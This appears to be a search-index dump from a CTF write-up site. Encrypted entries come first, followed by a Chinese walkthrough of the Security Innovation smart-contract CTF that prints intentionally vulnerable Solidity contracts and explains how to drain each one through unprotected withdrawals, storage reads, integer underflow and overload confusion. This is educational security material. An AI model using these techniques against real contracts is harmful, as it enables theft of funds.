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;^","title":"hard gambler"},{"location":"writeups/AAA/#money","text":"NHo9ExuJW6f2Uo+WWR8elA==;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;^","title":"money"},{"location":"writeups/SecurityInnovation/","text":"Security Innovation Smart Contract CTF Writeups \u00b6 Abstract https://blockchain-ctf.securityinnovation.com/ \u4e0a\u7684\u4e00\u7cfb\u5217\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u7c7b\u9898\u76ee\uff0c\u5165\u95e8 blockchain \u7684\u65f6\u5019\u505a\u7684\uff0c\u8fd9\u91cc\u8bb0\u4e0b\u505a\u9898\u8bb0\u5f55 \u524d\u7f6e\u6b65\u9aa4\uff1a \u5b89\u88c5 MetaMask \u6d4f\u89c8\u5668\u63d2\u4ef6\uff0c\u5e76\u521b\u5efa\u65b0\u8d26\u6237 \u8fde\u63a5\u5230 Ropsten \u6d4b\u8bd5\u7f51\u7edc \u901a\u8fc7 https://faucet.metamask.io/ \u641e\u70b9\u6d4b\u8bd5\u5e01 \u5728\u7f51\u7ad9\u4e0a\u8fde\u63a5 MetaMask\u3001\u90e8\u7f72\u9898\u76ee Donation \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract Donation is CtfFramework { using SafeMath for uint256 ; uint256 public funds ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { funds = funds . add ( msg.value ); } function () external payable ctf { funds = funds . add ( msg.value ); } function withdrawDonationsFromTheSuckersWhoFellForIt () external ctf { msg.sender . transfer ( funds ); funds = 0 ; } \u76ee\u7684\u662f\u628a\u5408\u7ea6\u8d26\u6237\u641e\u6ca1\u94b1\uff0c\u6240\u4ee5\u5728 Remix \u4e2d\u7f16\u8bd1\u4e0b\u4ee3\u7801\uff0c\u7136\u540e\u4ece\u9898\u76ee\u90e8\u7f72\u7684\u5408\u7ea6\u5730\u5740\u8f7d\u5165\u5408\u7ea6\uff0c\u518d\u8c03\u7528 withdrawDonationsFromTheSuckersWhoFellForIt \u51fd\u6570\u5373\u53ef Lock Box \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; contract Lockbox1 is CtfFramework { uint256 private pin ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { pin = now % 10000 ; } function unlock ( uint256 _pin ) external ctf { require ( pin == _pin , \"Incorrect PIN\" ); msg.sender . transfer ( address ( this ). balance ); } } \u53ef\u4ee5\u53d1\u73b0\uff0c\u9700\u8981\u8c03\u7528 unlock \u51fd\u6570\uff0c\u5b83\u9700\u8981\u63a5\u6536\u4e00\u4e2a\u6b63\u786e\u7684 pin\uff0c\u8fd9\u4e2a pin \u662f\u4ece\u521b\u5efa\u5408\u7ea6\u7684\u65f6\u95f4\u6233\u8ba1\u7b97\u6765\u7684\uff0c\u53ef\u4ee5\u5728\u94fe\u4e0a\u627e\u5230\u90e8\u7f72\u65f6\u95f4\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 web3 \u8bfb\u53d6\u5408\u7ea6 pin \u4f4d\u7f6e\u7684 storage \u4ece\u800c\u770b\u5230 pin \u5185\u5bb9\uff1a > await web3 . eth . getStorageAt ( \"0x56e06639308e17fd9d948ebaea5b2e4b4beef06e\" , 1 , ( x , y )=>{ console . log ( y );}) 0x0000000000000000000000000000000000000000000000000000000000000f73 \u7136\u540e\u540c\u6837\u5728 Remix \u4e0a\u7f16\u8bd1\u3001\u8f7d\u5165\u518d\u8c03\u7528 unlock \u51fd\u6570\u8f93\u5165\u6b63\u786e\u7684 pin \u5373\u53ef Piggy Bank \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract PiggyBank is CtfFramework { using SafeMath for uint256 ; uint256 public piggyBalance ; string public name ; address public owner ; constructor ( address _ctfLauncher , address _player , string _name ) public payable CtfFramework ( _ctfLauncher , _player ) { name = _name ; owner = msg.sender ; piggyBalance = piggyBalance . add ( msg.value ); } function () external payable ctf { piggyBalance = piggyBalance . add ( msg.value ); } modifier onlyOwner (){ require ( msg.sender == owner , \"Unauthorized: Not Owner\" ); _ ; } function withdraw ( uint256 amount ) internal { piggyBalance = piggyBalance . sub ( amount ); msg.sender . transfer ( amount ); } function collectFunds ( uint256 amount ) public onlyOwner ctf { require ( amount <= piggyBalance , \"Insufficient Funds in Contract\" ); withdraw ( amount ); } } contract CharliesPiggyBank is PiggyBank { uint256 public withdrawlCount ; constructor ( address _ctfLauncher , address _player ) public payable PiggyBank ( _ctfLauncher , _player , \"Charlie\" ) { withdrawlCount = 0 ; } function collectFunds ( uint256 amount ) public ctf { require ( amount <= piggyBalance , \"Insufficient Funds in Contract\" ); withdrawlCount = withdrawlCount . add ( 1 ); withdraw ( amount ); } } withdraw \u662f internal\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0ccollectFunds \u662f public \u53ef\u4ee5\u8c03\u7528 \u867d\u7136\u5728 PiggyBank \u5408\u7ea6\u4e2d\u52a0\u4e86 onlyOwner \u8fd9\u4e2a modifier\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u90e8\u7f72\u7684 CharliesPiggyBank \u5408\u7ea6\u91cd\u8f7d\u4e86\u8fd9\u4e2a\u51fd\u6570\u5e76\u6ca1\u6709\u5e26 modifier\uff0c\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528 collectFunds \u6765 withdraw \u9898\u76ee\u5408\u7ea6\u4e2d\u7684\u6240\u6709\u94b1 SI Token Sale \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; // https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v1.8.0/contracts/token/ERC20/StandardToken.sol import \"../StandardToken.sol\" ; contract SIToken is StandardToken { using SafeMath for uint256 ; string public name = \"SIToken\" ; string public symbol = \"SIT\" ; uint public decimals = 18 ; uint public INITIAL_SUPPLY = 1000 * ( 10 ** decimals ); constructor () public { totalSupply_ = INITIAL_SUPPLY ; balances [ this ] = INITIAL_SUPPLY ; } } contract SITokenSale is SIToken , CtfFramework { uint256 public feeAmount ; uint256 public etherCollection ; address public developer ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { feeAmount = 10 szabo ; developer = msg.sender ; purchaseTokens ( msg.value ); } function purchaseTokens ( uint256 _value ) internal { require ( _value > 0 , \"Cannot Purchase Zero Tokens\" ); require ( _value < balances [ this ], \"Not Enough Tokens Available\" ); balances [ msg.sender ] += _value - feeAmount ; balances [ this ] -= _value ; balances [ developer ] += feeAmount ; etherCollection += msg.value ; } function () payable external ctf { purchaseTokens ( msg.value ); } // Allow users to refund their tokens for half price ;-) function refundTokens ( uint256 _value ) external ctf { require ( _value > 0 , \"Cannot Refund Zero Tokens\" ); transfer ( this , _value ); etherCollection -= _value / 2 ; msg.sender . transfer ( _value / 2 ); } function withdrawEther () external ctf { require ( msg.sender == developer , \"Unauthorized: Not Developer\" ); require ( balances [ this ] == 0 , \"Only Allowed Once Sale is Complete\" ); msg.sender . transfer ( etherCollection ); } } \u53ef\u4ee5\u901a\u8fc7 refundTokens \u6765\u8f6c\u51fa\u4f59\u989d\uff0c\u4f46\u662f\u6700\u591a\u53ea\u80fd\u8f6c\u51fa balances \u7684\u4e00\u534a\uff0c\u6240\u4ee5\u8981\u5148\u63d0\u9ad8\u81ea\u5df1\u7684\u4ee3\u5e01\u4f59\u989d\u3002\u4e0d\u96be\u53d1\u73b0 purchaseTokens \u51fd\u6570\u4e2d\u5b58\u5728\u4e0b\u6ea2\uff1a balances [ msg.sender ] += _value - feeAmount ; \u53ea\u8981\u4f20\u5165\u7684 _value \u5c0f\u4e8e feeAmount \u5c31\u53ef\u4ee5\u4f7f balances \u4e0b\u6ea2\u3002\u867d\u7136 purchaseTokens \u51fd\u6570\u662f internal \u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0c\u4f46\u662f fallback \u51fd\u6570\u4e2d\u76f4\u63a5\u5c06 msg.value \u4f5c\u4e3a _value \u8c03\u7528\u4e86 purchaseTokens \u51fd\u6570\u3002\u56e0\u6b64\u53ef\u4ee5\u5148\u76f4\u63a5\u5411\u5408\u7ea6\u8d26\u6237\u8f6c 1Wei\uff0c\u5373\u53ef\u901a\u8fc7 fallback \u89e6\u53d1\u4e0b\u6ea2 \u4e4b\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 refundTokens \u6765\u8f6c\u51fa\u4e86\u3002\u53ef\u4ee5\u5148\u8c03\u7528 etherCollection \u770b\u4e00\u4e0b\u9700\u8981\u8f6c\u51fa\u7684\u91d1\u989d\uff08\u4e5f\u53ef\u4ee5\u901a\u8fc7\u521d\u59cb + 1Wei \u7684\u65b9\u5f0f\u8ba1\u7b97\uff09\uff0c\u518d\u4e58\u4ee5\u4e8c\u5c31\u662f\u8981\u4f20\u7ed9 refundTokens \u7684\u53c2\u6570\u4e86 Secure Bank \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; contract SimpleBank is CtfFramework { mapping ( address => uint256 ) public balances ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { balances [ msg.sender ] = msg.value ; } function deposit ( address _user ) public payable ctf { balances [ _user ] += msg.value ; } function withdraw ( address _user , uint256 _value ) public ctf { require ( _value <= balances [ _user ], \"Insufficient Balance\" ); balances [ _user ] -= _value ; msg.sender . transfer ( _value ); } function () public payable ctf { deposit ( msg.sender ); } } contract MembersBank is SimpleBank { mapping ( address => string ) public members ; constructor ( address _ctfLauncher , address _player ) public payable SimpleBank ( _ctfLauncher , _player ) { } function register ( address _user , string _username ) public ctf { members [ _user ] = _username ; } modifier isMember ( address _user ){ bytes memory username = bytes ( members [ _user ]); require ( username . length != 0 , \"Member Must First Register\" ); _ ; } function deposit ( address _user ) public payable isMember ( _user ) ctf { super . deposit ( _user ); } function withdraw ( address _user , uint256 _value ) public isMember ( _user ) ctf { super . withdraw ( _user , _value ); } } contract SecureBank is MembersBank { constructor ( address _ctfLauncher , address _player ) public payable MembersBank ( _ctfLauncher , _player ) { } function deposit ( address _user ) public payable ctf { require ( msg.sender == _user , \"Unauthorized User\" ); require ( msg.value < 100 ether , \"Exceeding Account Limits\" ); require ( msg.value >= 1 ether , \"Does Not Satisfy Minimum Requirement\" ); super . deposit ( _user ); } function withdraw ( address _user , uint8 _value ) public ctf { require ( msg.sender == _user , \"Unauthorized User\" ); require ( _value < 100 , \"Exceeding Account Limits\" ); require ( _value >= 1 , \"Does Not Satisfy Minimum Requirement\" ); super . withdraw ( _user , _value * 1 ether ); } function register ( address _user , string _username ) public ctf { require ( bytes ( _username ). length != 0 , \"Username Not Enough Characters\" ); require ( bytes ( _username ). length <= 20 , \"Username Too Many Characters\" ); super . register ( _user , _username ); } } \u5408\u7ea6\u6709\u70b9\u957f\uff0c\u6709\u4e09\u4e2a\u5408\u7ea6 SimpleBank\u3001MembersBank \u548c SecureBank\uff0c\u662f\u9010\u4e2a\u7ee7\u627f\u7684\u5173\u7cfb \u901a\u8fc7 SimpleBank \u7684 constructor \u53ef\u4ee5\u770b\u51fa\uff0c\u6240\u6709\u94b1\u90fd\u8f6c\u7ed9\u4e86\u9898\u76ee\u5408\u7ea6\u7684\u521b\u5efa\u8005\uff0c\u800c\u8fd9\u4e2a\u53ef\u4ee5\u901a\u8fc7 etherscan \u67e5\u5230\uff0c\u6240\u4ee5\u76ee\u6807\u5c31\u662f\u8c03\u7528 withdraw \u51fd\u6570\u6765\u501f\u52a9\u521b\u5efa\u8005\u7684\u5730\u5740\u8f6c\u51fa\u5408\u7ea6\u4e2d\u7684\u94b1 \u800c withdraw \u5b58\u5728\u4e86\u4e00\u4e9b\u95ee\u9898\uff1a SecureBank \u4e2d\u7684 withdraw \u68c0\u67e5\u4e86\u4f20\u5165\u7684 _user \u662f\u5426\u662f msg.sender\uff0c\u4e0d\u80fd\u4ece\u4e2d\u9020\u5047 SecureBank \u7684 withdraw \u7684 _value \u53c2\u6570\u662f uint8 \u7c7b\u578b\uff0c\u800c MembersBank \u4e2d withdraw \u7684\u53c2\u6570\u662f uint256 \u7c7b\u578b\uff0c\u8fd9\u5bfc\u81f4\u4e86\u8fd9\u4e24\u4e2a\u51fd\u6570\u5e76\u4e0d\u662f\u91cd\u8f7d\u5173\u7cfb\uff0c\u800c\u662f\u4e24\u4e2a\u51fd\u6570 \u6240\u4ee5\u73b0\u5728\u7684\u76ee\u6807\u662f\u8c03\u7528 MembersBank \u7684 withdraw \u51fd\u6570\u3002\u53ef\u4ee5\u53d1\u73b0\u5b83\u5e26\u6709\u4e00\u4e2a isMember(_user) \u7684 modifier\uff0c\u6240\u4ee5\u5148\u8981\u7ed9\u521b\u5efa\u8005\u7684\u5730\u5740 register \u4e00\u4e0b\uff0c\u7136\u540e\u518d\u8c03\u7528 withdraw(address, uint256) \u8f6c\u51fa\u6240\u6709\u4f59\u989d\u5373\u53ef Lottery \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract Lottery is CtfFramework { using SafeMath for uint256 ; uint256 public totalPot ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { totalPot = totalPot . add ( msg.value ); } function () external payable ctf { totalPot = totalPot . add ( msg.value ); } function play ( uint256 _seed ) external payable ctf { require ( msg.value >= 1 finney , \"Insufficient Transaction Value\" ); totalPot = totalPot . add ( msg.value ); bytes32 entropy = blockhash ( block.number ); bytes32 entropy2 = keccak256 ( abi . encodePacked ( msg.sender )); bytes32 target = keccak256 ( abi . encodePacked ( entropy ^ entropy2 )); bytes32 guess = keccak256 ( abi . encodePacked ( _seed )); if ( guess == target ){ //winner uint256 payout = totalPot ; totalPot = 0 ; msg.sender . transfer ( payout ); } } } 